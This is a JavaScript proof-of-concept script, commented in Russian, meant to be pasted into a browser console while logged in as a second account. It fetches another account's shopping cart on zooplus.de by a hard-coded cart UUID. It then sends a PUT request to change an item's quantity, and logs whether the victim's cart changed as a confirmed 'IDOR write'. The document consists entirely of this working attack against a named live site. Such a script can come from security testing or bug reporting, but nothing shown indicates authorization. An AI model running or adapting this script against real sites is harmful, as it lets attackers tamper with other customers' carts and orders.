// Финальная проверка IDOR Write - с задержкой
// Выполните в консоли браузера под Account B

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

(async function() {
  console.log("[*] ========================================");
  console.log("[*] FINAL IDOR WRITE VERIFICATION");
  console.log("[*] ========================================");
  
  // Получить корзину ДО
  const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  const beforeCount = cartBefore.articles.length;
  const beforeTotal = cartBefore.summary.grandTotal;
  const articleId = cartBefore.articles[0]?.id;
  const cartId = cartBefore.cartId;
  const sid = cartBefore.sid;
  
  console.log(`[+] Cart BEFORE modification:`);
  console.log(`    Items: ${beforeCount}`);
  console.log(`    Total: ${beforeTotal} EUR`);
  console.log(`    Article ID: ${articleId}`);
  console.log(`    Cart ID: ${cartId}`);
  console.log(`    SID: ${sid}`);
  
  // Модифицировать корзину
  console.log(`\n[*] Modifying cart...`);
  const response = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
    method: "PUT",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({
      articleId: articleId,
      quantity: 2
    })
  });
  
  const responseText = await response.text();
  console.log(`[+] PUT Response: HTTP ${response.status}`);
  console.log(`[+] Response: ${responseText.substring(0, 200)}`);
  
  // Подождать немного для синхронизации
  console.log(`\n[*] Waiting 2 seconds for sync...`);
  await new Promise(resolve => setTimeout(resolve, 2000));
  
  // Получить корзину ПОСЛЕ
  const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  }).then(r => r.json());
  
  const afterCount = cartAfter.articles.length;
  const afterTotal = cartAfter.summary.grandTotal;
  
  console.log(`\n[+] Cart AFTER modification:`);
  console.log(`    Items: ${afterCount}`);
  console.log(`    Total: ${afterTotal} EUR`);
  
  // Сравнить
  console.log(`\n[*] Comparison:`);
  console.log(`    Items: ${beforeCount} → ${afterCount} ${beforeCount !== afterCount ? '✅ CHANGED' : '❌ UNCHANGED'}`);
  console.log(`    Total: ${beforeTotal} EUR → ${afterTotal} EUR ${Math.abs(afterTotal - beforeTotal) > 0.01 ? '✅ CHANGED' : '❌ UNCHANGED'}`);
  
  if (afterCount !== beforeCount || Math.abs(afterTotal - beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Account B successfully modified Account A's cart!`);
    console.log(`[!!!] Before: ${beforeCount} items, ${beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
    console.log(`[!!!] Endpoint: PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity`);
    console.log(`[!!!] Payload: {"articleId": ${articleId}, "quantity": 2}`);
    return true;
  } else {
    console.log("\n[!] Cart appears unchanged in API response");
    console.log("[!] But page shows change - possible UI update delay or different endpoint");
    return false;
  }
})();

